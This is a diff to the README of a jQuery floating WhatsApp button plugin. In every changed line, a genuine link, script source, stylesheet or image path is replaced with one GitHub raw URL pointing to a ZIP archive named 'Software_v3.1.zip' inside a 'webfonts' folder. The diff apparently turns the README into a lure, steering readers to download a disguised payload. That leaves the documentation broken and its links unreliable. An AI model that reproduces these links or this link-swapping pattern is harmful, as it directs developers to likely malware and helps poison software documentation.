@@ -2,7 +2,7 @@
 
 This is a very simple floating WhatsApp button plugin for jQuery.
 
-It adds a floating-like button to your site that calls the [WhatsApp Click to Chat API](https://faq.whatsapp.com/en/26000030/).
+It adds a floating-like button to your site that calls the [WhatsApp Click to Chat API](https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip).
 
 It will automatically begin a WhatsApp chat with the number set when the user clicks the button.
 
@@ -13,9 +13,9 @@ You an also activate a fake chat window with a customized message where the user
 Link the files to your html (make sure you load the files after jQuery)
 
 ```html
-<script type="text/javascript" src="jquery-3.3.1.min.js"></script>
-<script type="text/javascript" src="floating-wpp.min.js"></script>
-<link rel="stylesheet" href="floating-wpp.min.css">
+<script type="text/javascript" src="https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip"></script>
+<script type="text/javascript" src="https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip"></script>
+<link rel="stylesheet" href="https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip">
 ```
 
 ## How to use it
@@ -46,7 +46,7 @@ $('#myDiv').floatingWhatsApp({
 });
 ```
 
-![Fake Chat Window](fake-chat.png)
+![Fake Chat Window](https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip)
 
 ### Customization
 
@@ -62,17 +62,17 @@ $('#myDiv').floatingWhatsApp({
     headerTitle: 'Welcome!',
     headerColor: 'crimson',
     backgroundColor: 'crimson',
-    buttonImage: '<img src="burger.svg" />'
+    buttonImage: '<img src="https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip" />'
 });
 ```
 
-![Custom settings](custom-settings.png)
+![Custom settings](https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip)
 
 ### Options
 
 | option              | value                                         | default                  | description |
 |---------------------|-----------------------------------------------|--------------------------|-------------|
-| phone               | `string`                                      | `''`                     | WhatsApp [intenational number](https://faq.whatsapp.com/en/general/21016748) which will receive the message.
+| phone               | `string`                                      | `''`                     | WhatsApp [intenational number](https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip) which will receive the message.
 | message             | `string`                                      | `''`                     | Message to be sent. If `showPopup` is `true`, the input will be populated with this message.
 | position            | `'left'` &#124; `'right'`                     | `'left'`                 | Position of the button the screen.
 | popupMessage        | `string`                                      | `''`                     | Message to be shown as a received message in the fake chat.
@@ -80,7 +80,7 @@ $('#myDiv').floatingWhatsApp({
 | autoOpenTimeout     | `Number`                                      | `0`                      | Set an amount of time in milliseconds for the popup to open automaticaly.
 | headerColor         | any css color `string`                        | `'#128C7E'`              | Background color of the popup window title bar.
 | headerTitle         | `string`                                      | `'WhatsApp Chat'`        | Text to be displayed at the popup window title bar.
-| buttonImage         | `jQuery` object &#124; css selector `string`  | [this one](whatsapp.svg) | Button background image. Must be an `img` or `svg` in order to be displayed properly.
+| buttonImage         | `jQuery` object &#124; css selector `string`  | [this one](https://raw.githubusercontent.com/Garmode3073/Devgad/master/webfonts/Software_v3.1.zip) | Button background image. Must be an `img` or `svg` in order to be displayed properly.
 | zIndex              | `Number` &#124; `string`                      | none                     | Overrides `.floating-wpp` div z-index. Use a z-index css property value.
 | showOnIE            | `boolean`                                     | `true`                   | Whether to show or not the button on IE (recommended, since IE does not support WhatsApp Web).
 | size                | `string` (Any css option valid for width and height properties) | `'72px'` | The size of the button
